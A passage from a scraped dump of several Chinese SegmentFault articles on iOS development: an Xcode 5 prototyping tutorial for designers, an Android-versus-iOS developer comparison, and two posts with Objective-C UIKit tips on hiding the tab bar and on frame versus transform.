<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDm2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
选择单视图应用（Single-View Application），然后给它命名。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDnx"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
每一个新项目都有一个故事板(Storyboard)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDnS"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
增加一个构件库(Assets Library)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDn6"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
每个 iOS 设计师都会对应用图标（AppIcon）和登录图片（LaunchImage）感到熟悉。通过鼠标拖拉就可以把图片填充上去。（译者注：这里对图片格式会有要求，如不可以添加 jpg 格式图片，可以添加 .png 格式图片）</p>

<h1>构件库，我的最爱</h1>

<p>如何把设计好的构件效果在移动设备上完整实现出来，一直是设计师和开发者交流时最大的问题。<br>
开发者们不得不学 Sketch 或者 Photoshop 去实现设计师他们的设计，或者，不得不就怎么样把构件效果实现出来和设计师们讨论。对绝大部分的设计师来说，为构件写文档是一个非常耗时间但又是必须做的事情。然后，就有了那些可怕的可伸缩插件。你必须知道它们是怎么编写出来的，但这些又是非常复制，复杂到需要很多教程来学习。然后，现在不用了。 Xcode 5 会自动为你穿件这些可伸缩构件。<br>
<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDs4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
来自 <a rel=""nofollow"" href=""http://bohemiancoding.com/sketch"">Sketch</a>, 把插件以 2倍大小和一半大小到处。Sketch 会自动命名好。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDth"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
从 Sketch 中导入构件到 Xcode 中，Xcode 会自动匹配它们。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDtn"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
对于那些可伸缩的构件，点击打开显示切片(Show Slicing)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDto"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
然后，点击 开始切片(Start Slicing）</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDtu"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
根据你需要，点击这三个按钮进行挑战</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDtv"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
看，Xcode 自动为你做好这些了。然后根据这个流程，处理你那些按钮和气泡。</p>

<h3>你的第一个屏幕显示</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDtz"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
让我们开始做第一个屏幕显示。在你的故事板中，从对象库（Object Library）中拖拉图像视图(Image View)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDtA"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
然后，去属性检测器（Attributes Inspector）中编辑图像。如果在构件库中找到对应构件， Xcode 会自动显示出效果。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDyH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
试着把图拉拽到另一个 图像视图（Image View），然后把它设成气泡白。当你调整尺寸时，你会注意到它能很好的适应伸展。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDyI"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
然后创造一个头像。当你按住 Alt 的时候，你会看到一个类似在 Sketch 中的功能:)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDyR"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
现在，拖拽一个标签（Label），然后后设置文字（Text）内容，你可以把行数（Lines）设为 0，这样就可以不限制行数了。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDy0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
去尺寸检测器（Size Inspector）那，用数字调整尺寸，这会更精确。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDy1"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
作为一个完美主义者，你应该尽可能让你的设计变得更好:)</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDy5"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
关于字体，你可以选择一个较瘦的 iOS7 字体, 推荐 Helvetica Neue Light</p>

<h3>输入信息的界面</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDy6"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
把 View 拖进来，它就像是一个文件夹那样，你可以把所有的东西拖进去。它有自己的属性，是非常好用的。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDy7"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
如果你也做过 CSS 的话，文字框某些属性你应该会熟悉。确认下边框效果(Border style)已经取消了。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDza"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
然后，那个声名狼藉的按钮。注意高亮显示的那些属性。</p>

<h3>导航条</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDzd"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
这里有一个简洁的技巧：去帮助(Help)菜单，找到嵌入(Embed)，热后，在导航控制（Navigation Controller）中选择嵌入。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDzo"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
在左边边框，选择导航条（Navigation Bar）, 它在故事板中自带了许多中样式可以选择。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDzr"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
想要一个标题？编辑你的 视图控制器（View Controller）的导航条目(Navigation Item)下的属性.</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDzs"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
是的，导航条有执行按钮。这个对象是在每个库的最末端。记得去编辑下着色的颜色，因为 Xcode 会自动帮你的图像上色。</p>

<h3>圆角</h3>

<p>在 CSS 中，你经常不想使用图像来做一些类似圆角的效果。但是，在 Xcode5 中，你可以程序化地设置圆角，这非常有用。<br>
<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDzC"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
在这个表格中，我们要创建一个视图（View），它可以放置所有的东西，然后加上圆角。记得打开<br>
""剪切子视图(Clip Subviews)""，它的作用就相当于「overflow:hidden」</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAr"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
设置 layer.cornerRadius 运行时属性（Runtime Attribute）</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAv"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
这个效果不会在故事板中显示出来，但会在模拟器中显示出来。</p>

<h3>链接到其他屏幕</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAC"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
创建一个空的按钮，然后把它放在视图里面</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAD"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
按住 Ctrl，把那个按钮拖拽到其他屏幕。选择推送（Push），记得在根屏幕上有一个导航条，否则这个会没效果。</p>

<h3>1像素（px）的行</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAP"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
Xcode 是在 pt 单元运作的（pt unit）。你其实没有真的创建一个视图，然后把视图设成 0.5pt 或者 1px。所以，如果你需要建一个头发那样细的行，你必须要创建一个 1 像素的构件。</p>

<h3>工具条导航</h3>

<p>iOS 自带的工具条非常具有可定制性的。你可以改变它的颜色、文字和图标。<br>
<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDAU"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
选择了视图控制器之后，搜过之前做过的 「嵌入」，然后这次选择 Tab 条（Tab Bar）。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDA6"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
就像在导航条的那样，你可以在每个视图控制器中编辑</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDA7"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
有时候，你不想要导航条或者工具条，你可以通过「选择下方条为空（Selecting Botton Bar to None）」，然后点击「隐藏下方条推送（Hide Botton Bar on Push）」。</p>

<h3>滚动</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDBg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
每个人都钟爱 iOS 上的滚动反弹(Bounce back scroll), 如果你也想要这个效果，你必须有一个表格视图（Table View）作为容器，它的结构是：Table View / View (full) / Your objects.</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDBh"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
小心，表格视图和视图会提前加载一个白色背景。确保已经设置成清色（Clear color）了。</p>

<hr>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDBm"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
在屏幕中，有部分是可滚动的，这个能使屏幕活泼些。</p>

<hr>

<p>下载这个 Xcode 项目：<br>
可以在上面这个项目上自己进行摸索，可以随便调试设计，项目的资源文件在：<br>
<a rel=""nofollow"" href=""http://cl.ly/2A0m0j0i0g1K"">http://cl.ly/2A0m0j0i0g1K</a></p>

<h3>没有代码</h3>

<p>如果你回头看看那些复杂的部分，Xcode 会比 HTML/CSS/SCSS/Javascript 简单得多。它提供了强大的 UI 可以让你编辑绝大多数应用上的视觉元素。某种意义上来说，它就是所见即所得了（WYSIWYG）。下次，我会讨论如何用最少代码，仅依靠使用 CocoaPds和第三方库的去定制字体、声音、动画等。如果你有兴趣关注后续 Ripple 应用的开发或相关 Xcode 教程，你可以在twitter 上关注我：@<a rel=""nofollow"" href=""http://twitter.com/mengto"">mengto</a></p>

<hr>

<p>原文链接：<a rel=""nofollow"" href=""https://medium.com/design-ux/62b643a3a0f7"">Learning Xcode 5 As a Designer</a><br>
翻译：<a rel=""nofollow"" href=""http://segmentfault.com/"">SegmentFault</a></p>

                ", 写给设计师同学的xcode使用教程: 教你用 Xcode 做原型设计,1531972200,435,1,295,1,1,https://segmentfault.com/a/1190000000350973
202,1,0,6,"
                    <p>Android的市场份额已经超过80%了，在这一背景下，创业公司永恒的问题“Android优先还是iOS优先”愈显棘手。不过也许经理们和非技术出身的创始人们不用操心这个问题，他们可以把这个烦心的问题交给开发者们！那开发者们是咋想的？很简单，谁能让他们更轻松，谁就能获得巨大的优势。</p>

<p>Techcrunch的专栏作者Jon Evans，同时也是<a rel=""nofollow"" href=""http://www.happyfuncorp.com/"">HappyFunCorp</a>（是不是很羡慕这个咨询公司的名字？）的工程师，为了让自己不手生，Evans编写并开源了两个私人宠物项目。这是近乎一模一样的Android和iOS应用。Evans以这两个应用为例，<a rel=""nofollow"" href=""http://techcrunch.com/2013/11/16/the-state-of-the-art/"">比较了Android和iOS的差异</a>。</p>

<p>Evans之前编写了很多Android和iOS应用，有私人项目，也有工作项目。上面提到的两款应用都是原生应用，为Evans开发的新闻聚合器Scanvine编写。Scanvine可以识别出在社交媒体中分享得不同寻常之多的故事。两个应用的源代码放在Github上：（ <a rel=""nofollow"" href=""https://github.com/rezendi/scanvine-android"">Android</a> | <a rel=""nofollow"" href=""https://github.com/rezendi/scanvine-ios"">iOS</a>），可以通过<a rel=""nofollow"" href=""https://play.google.com/store/apps/details?id=com.scanvine.android"">Google Play</a>或<a rel=""nofollow"" href=""https://itunes.apple.com/app/scanvine/id717815889?mt=8"">App Store</a>）安装。</p>

<h2>开发环境</h2>

<p>Evans赞扬了苹果的Xcode，“它让人开发起来很愉悦”。Xcode漂亮、快速、强大，帮人而非扰人。Xcode的调试工具运行平滑，模拟器反应很灵敏。</p>

<p>Android则让Evans很失望。目前Android最先进的IDE是用Android插件定制的Eclipse，很糟。迟钝、笨重、反直觉、布局糟糕、不必要的复杂，简直就是一团糟。调试工具也非常笨拙，迫使Evans在大部分时间通过日志进行调试，和XCode的调试工具有天壤之别。Android的模拟器也慢得很，要花几分钟才能启动，其中差不多有一半时间没法连接到Android Debug Bridge。</p>

<p>公平地说，Google也知道这是一个问题，他们正在着手制作一款新的IDE，叫做Android Studio。不过Android Studio目前仅仅提供先期预览版。很多功能不完整或者干脆没有。用户有时也会遇到错误。</p>

<p><strong>优势</strong>：iOS甩了Android几条街。</p>

<h2>配置</h2>

<p>Evans指出，在Xcode和Objective-C漂亮、无缝的外表之下，隐藏着一堆麻烦：宏和头文件、项目、目标代码以及构建配置，等等。繁多的构建设置列表，令人困惑的链接器错误，让人绝望。时不时还会有些“惊喜”：“天，这个第三方代码居然不支持ARC？得加上-fno-objc-arc标记！”。</p>

<p>Android的配置文件只有一个，每当开发者保存一次文件，Eclipse就会构建一次应用。当然，在因配置授权不当而导致应用不工作时，错误消息少了点。不过这只是细节，总体来说，Android的应用配置简单且简洁。</p>

<p><strong>优势</strong>：Android。</p>

<h2>UX设计</h2>

<p>Xcode的界面搭建器能非常迅速地将简单、漂亮的用户界面以一种非常赏心悦目地方式组织在一起。问题是，这又加了一层配置复杂度。对于简单应用而言，很好，但随着时间推移和应用发展，这些简单的东西会变得复杂、混乱。Evans也非常不喜欢苹果在大约一年前增加的多屏故事板。</p>

<p>理论上，Android有一个可比肩的可视化工具，不过这只是理论上而已。实际情况是，你需要编写提供布局指导的XML文件，以便让应用在多种设备的多种屏幕上渲染得很好。（苹果的自动布局也走这条路，应该是为未来出现的更多尺寸的iOS屏幕作准备）同时，Android提供了一个图标包供开发者们使用，而iOS开发者们则必须使用Icons8等第三方服务或自己制作。</p>

<p>总的来说，这方面的差距要比想象中的小。总体来说，两样东西让iOS占据优势：首先，Xcode要简单的多：只有三种屏幕尺寸（包括iPad）和两种屏幕密度，而不像Android一样复杂。其次，默认的iOS视觉元素，比如弹出目录和消息，看起来要比Android吸引人得多。</p>

<p><strong>优势</strong>：iOS。</p>

<h2>语言</h2>

<p>Android应用使用Java编写，iOS应用则使用Objective-C。当然你也可使用其他工具，以便使用其他语言，比如Evans推荐的xamarin，还有PhoneGap之类。不过总的来说，原生Android应用使用Java编写，原生iOS应用使用Objective-C编写。</p>

<p>Evans起初觉得Objective-C非常啰嗦：比如语句</p>

<pre><code class=""lang-java"">String s2 = s1.replace(“abc”,”xyz”);
</code></pre>

<p>在Objective-C中变成了</p>

<p><code>objective-c
NSString *s2 = [s1 stringByReplacingOccurrencesOfString:@""abc"" withString:@""xyz""];</code></p>

<p>不过后来Evans越來越喜欢Objective-C了。Objective-C比Java更整洁。Objective-C有block，Java没有。Objective-C有category，Java也没有。ObjC 不需要你把很多代码用一望无际的 try/catch 异常处理空行围起来; Java 需要. </p>

<p>Java也有其优势。比如更好的堆栈跟踪(stack trace)，这让追踪零星的错误变得更容易。两年前，Android还有垃圾收集的巨大优势，但现在iOS有了ARC，这一优势就消失无踪了（尽管老的第三方工具通常不支持ARC，开发者必须进行一些XCode配置，才能关闭ARC）。考虑到iOS的这一进步，赢家就很明显了。</p>

<p><strong>优势</strong>：iOS。</p>

<h2>API</h2>

<p>Android和iOS都向开发者们提供了庞大的软件库。从宏观上看，这些库都很相似：有针对手机功能、网络访问功能、包括强大的WebView在内的View对象的API。绝大部分工作都是由控制器完成：iOS的ViewController差不多就相当于一个Android Activity。</p>

<p>iOS有而Android没有的是一套额外的框架和功能，比如Android就没有iOS强大的Core Data框架的对应物，也没有iOS那样更整洁、更好的设计系统。比较这两个应用中起到相同作用的类，Evans在Android类上花的时间比在iOS类上花的时间要多。</p>

<p>至于代码行数。这两款应功能近乎一样，但iOS应用的自定义代码有1596行，包括头文件；而Android应用的Java代码和XML代码加起来有2109行，多了32%多。</p>

<p><strong>优势</strong>：iOS。</p>

<h2>网络</h2>

<p>如今大部分应用都使用互联网API，而不是单独的程序；这点非常重要，值得拿出来单说。iOS和Android都为此提供了全套工具和API。它们都提供了非常相似的WebView，基本上就是功能齐全的浏览器，开发者可以在应用中任何地方插入。</p>

<p>网络连接基本上都是在后台运行，以便不堵塞主线程，不过多线程不好处理。Android提供AsyncTask类来做这类事，虽然很啰嗦，但效果很好，而且判断是否联网也很方便。iOS也提供类似的功能，可惜它们的表现相当低级，不能让人满意。</p>

<p>不过，有一堆开源库让生活变得轻松多了。Evans用的是AFNetworking，感觉非常好。只需在网络请求完成后将代码块传递给它就能运行，这在Android中根本不可能，因为Java没有block。</p>

<p><strong>优势</strong>：原生Android有优势，但考虑到第三方库时iOS有优势。</p>

<h2>分享</h2>

<p>从应用中分享东西到Facebook、Twitter、Evernote等服务上有多容易？Evans曾经以为Android会完胜iOS。长期以来，Android就有一个名为Intents的强大的应用间通讯系统。总体上说，Android在应用间请求并分享数据上要好很多。</p>

<p>而在更广泛意义上的分享上，苹果领先很多。具体可以看Evans的项目中分享Scanvine故事的Android代码和iOS代码。</p>

<p><strong>优势</strong>：都不够好。</p>

<h2>碎片化</h2>

<p>这一问题根本不用多说，答案当然是iOS胜出。值得注意的是，Google正进行一项有趣的去碎片化战略，也许很快这一点就需要重新探讨了。</p>

<p><strong>优势</strong>：iOS。</p>

<h2>发布</h2>

<p>发布一款Android应用非常容易。只需要用一个方便的Eclipse向导来签名应用，你就会得到一个可以在任何设备上运行的APK文件。可以用电子邮件发送，可以传到网站上，当然也可以上传到Google Play中，你可以在一小时内向全世界提供你的应用。不能再简单一些了。省下来的时间你可以用来检查安装数据和崩溃报告，包括查找有问题的代码，并能立即上传修复错误的版本。</p>

<p>发布一款苹果应用则是噩梦。Evans建议留出至少一天的iOS开发时间来解决证书和发行档案问题。尽管最新版的XCode试图让这一过程变得更容易，但这始终是个很大的困扰。如果没有TestFlight，测试甚至会更糟。苹果的iTunes Connect网站比起Google Play开发者终端就像福特之于特斯拉。基本上你收不到苹果应用的崩溃报告，收到了里面也不会有什么有用的信息，你只能自求多福。你最终会为强大的苹果UX有多糟糕而深感震惊。</p>

<p><strong>优势</strong>：Android领先很多。</p>

<h2>那么赢家是?</h2>

<p>iOS要领先很多。Android有其优势，但总的来说，编写好的iOS应用要比编写好的Android应用容易得多。加上iOS用户更有钱，更有影响力，大部分想要闯出名头的创业公司还是应该以iOS为先。新的Android Studio IDE也许会极大地缩短差距，但并不是全部。</p>

<p><a rel=""nofollow"" href=""http://techcrunch.com/2013/11/16/the-state-of-the-art/"">Jon Evans的原文</a>（英文）</p>

<p>本文由<a rel=""nofollow"" href=""http://segmentfault.com"">SegmentFault</a>编译整理。</p>

                ", Android与iOS的对决,1531972202,237,1,470,1,1,https://segmentfault.com/a/1190000000338269
203,1,0,6,"
                    
<p>今天说的是在TabBar嵌套Nav时，进行Push的时候隐藏TabBar的问题。</p>
<p>之前项目也需要这么做，那时候 iOS7 还没出，也是各种搜罗，后来的解决方法是当push操作的时候自己隐藏 Tabbar，push 过去视图拉伸适应屏幕，再 pop 回来的时候接再显示 Tabbar，过程复杂还需要自己写动画，最终效果也不是很理想。</p>
<p>前两天公司 APP上架，当时没有适配 iOS7，在 XCode4.6 上开发编译并发布，居然在iOS7下跑起来没有太大的问题，只是一个Nav的文字错位，有闪退，不过勉强还能用，其中有自定义Tabbar，有很多动画，后来在一篇介绍 iOS7 适配的文章中看到这么一句话：</p>
<blockquote><p>在Xcode 4.6上使用iOS 6 SDK进行编译的app在iOS<br>7上运行时是采用一种特殊的模拟模式，它试图保存app原来的样子。但是一旦你升级到了Xcode 5，在iOS<br>7SDK上编译，你的app就会开始出现状况了。</p></blockquote>
<p>已经写的很清楚了，于是我再到Xcode5中编译运行原来的项目，就破漏百出了，开始完全崩溃，各种问题浮现。</p>
<p>好了，回到今天说的正题，先和大家说说hidesBottomBarWhenPushed，从这个属性名也能知道它的意思了，官方的解释是这样：</p>
<blockquote><p>If YES, then when this view controller is pushed into a controller hierarchy with a bottom bar (like a tab bar), the bottom bar will slide out. Default is NO.</p></blockquote>
<p>大致意思是如果为YES，当这个控制器push的时候，底部的Bar，比如Tabbar会滑走，也就是不会在push后的视图上显示出来，默认值为NO。</p>
<p>我讲的场景大概为这个样子：</p>
<p>&lt;center&gt;<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbxmP"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""整体结构"" title=""整体结构""></span>&lt;/center&gt;</p>
<p>最外面是一个TabBarController，套了两个NavgationController，当其中一个VC push下去的时候，一般情况是这样：</p>
<p>&lt;center&gt;<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbxmQ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""push"" title=""push""></span>&lt;/center&gt;</p>
<p>当隐藏Tabbar的时候再push，效果是这样：</p>
<p>&lt;center&gt;<span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbxmR"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""push next"" title=""push next""></span>&lt;/center&gt;</p>
<p>怎么样，是不是有时候确实会遇到这样的情况？其实苹果真的考虑的很周全，为我们创造了<strong>hidesBottomBarWhenPushed</strong>这个属性，为了解决这个问题。代码非常简单，一句或者两句话即可，这里得分几种Push的情况。</p>
<p><strong>Case1</strong>：xib加载或者Storyboard用identifier获取Controller</p>
<pre><code>UIViewController *v2 = [self.storyboard instantiateViewControllerWithIdentifier:@""v2""];
v2.hidesBottomBarWhenPushed = YES;
[self.navigationController pushViewController:v2 animated:YES];</code></pre>
<p><strong>Case2</strong>：拉线，也就是Storyboard用performSegue</p>
<pre><code>self.hidesBottomBarWhenPushed = YES;
[self performSegueWithIdentifier:@""tov2"" sender:nil];
self.hidesBottomBarWhenPushed = NO;</code></pre>
<blockquote><p>Tip:经测试证明，此种方式只会对后面的一级生效，继续往后Push还会出现TabBar，要继续往后push也隐藏Tabbar还得使用Case3的方法，也建议如此！</p></blockquote>
<p><strong>Case3</strong>：拉线，在prepareForSegue函数里</p>
<pre><code>-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    [segue.destinationViewController setHidesBottomBarWhenPushed:YES];
}</code></pre>
<p><strong>更方便的做法</strong>：如果用 Storyboard，可以在 ViewController 的设置面板中把 <code>Hide Bottom Bar on Push</code> 属性勾选上，效果和上文代码一样。</p>
<p>暂时就用到这几点，我之前的做法，自己手动隐藏，拉伸view，显示不但麻烦，兼容性也不好，移到iOS7上问题多多，不过用这个属性可以非常方便的实现此需求，并且在iOS6上也完美兼容哦。</p>
<blockquote><p><strong>注意：</strong>还有个问题，这个属性只支持非自定义的Tabbar，也就是只支持原生Tabbar，如果是自定义的Tabbar会产生你意想不到的效果，我之前就遇到过，因为使用hidesBottomBarWhenPushed后，系统内部会处理TabbarController上Tabbar这个View，我之前自定义的Tabbar做法是吧原生Tabbar这个View隐藏掉，然后添加到自己绘制的Tabbar<br>View上去，缺点就是这样你的自定义的TabBarview接收不到系统应有的一些响应，于是我尝试着把自定义的TabBar<br>View添加到原来的TabBar View上，也就是不隐藏原生的TabBar，而是覆盖在上面，看不出任何区别，效果也能达到上面图片的效果！</p></blockquote>

                ", iOS:hidesBottomBarWhenPushed的正确用法,1531972203,105,1,190,1,1,https://segmentfault.com/a/1190000000327529
204,1,0,6,"
                    <p>最近一直在做photoGrid的iOS版本的开发，遇到过很多问题。<br>
目前我的UIView里有一个UIImageView。<br>
这里的UIImageView的状态初始是这样的：  </p>

<pre><code class=""lang-objectivec"">_imageView = [[UIImageView alloc] init];
_imageView.frame = self.bounds;
_imageView.contentMode = UIViewContentModeScaleAspectFill;
_imageView.autoresizingMask = (UIViewAutoresizingFlexibleHeight |
                               UIViewAutoresizingFlexibleWidth  |
                               UIViewAutoresizingFlexibleTopMargin |
                               UIViewAutoresizingFlexibleLeftMargin|
                               UIViewAutoresizingFlexibleRightMargin |
                               UIViewAutoresizingFlexibleBottomMargin);

</code></pre>

<p>因为这个是拼图软件，坐标都是计算转换出来的，难免有浮点，而iOS支持的坐标最小是 0.5f 的精度。在对外面的UIView和内部的ImageView的坐标都进行设置后，我们发现图片和图片之间会有明显的缝隙，这是为什么呢？  </p>

<p>系统会对UIImageView的坐标进行优化，会成为整型，这样我们就看到了Image和Image之间的明显的缝隙了。  </p>

<p>那么如何解决呢？
很简单，设置一下UIImageView的frame  </p>

<pre><code class=""lang-objectivec"">_imageView.frame = self.bounds;
</code></pre>

<p>但是这样做带来了别的问题。  </p>

<p>因为我在这里有对这个UIImageView的仿射矩阵做(transform)变换以达到位移、放缩等效果。如果在设置了frame之后再对这个UIImageView做改变仿射矩阵操作，你会发现之前的效果被重置了，如果此时你再去做放缩等操作，都是在原来的基础上再做的变化。<br>
比如，之前你缩小到0.5倍，然后你会发现图片会重置到ScaleAspectFit，然后再缩小到0.5倍，此时的仿射矩阵的倍率值(transform.a)就是0.25了，而肉眼观察到的则是0.5倍的缩放。<br>
哪儿有问题呢？  </p>

<p>最后终于在API Document里面找到这么一小段话</p>

<pre><code class=""lang-objectivec"">// animatable. do not use frame if view 
// is transformed since it will not correctly 
// reflect the actual location of the view. use bounds + center instead.

// 动画属性。不要在view变形之后使用frame
// 否则会导致其不能正确的映射出view的真实位置。用bounds + center 代替
</code></pre>

<p>好吧，一切释然了，我检查了好久的bug居然只是一句小小的注释就解决了。</p>

<pre><code class=""lang-objectivec"">//_imageView.frame = self.bounds;
_imageView.bounds = self.bounds;
_imageView.center = CGPointMake(self.bounds.size.width / 2, self.bounds.size.height / 2);
</code></pre>

<p>OK，正常了！</p>

                ", iOS坑：UIView的frame和transfrom,1531972205,507,1,801,1,1,https://segmentfault.com/a/1190000000308985
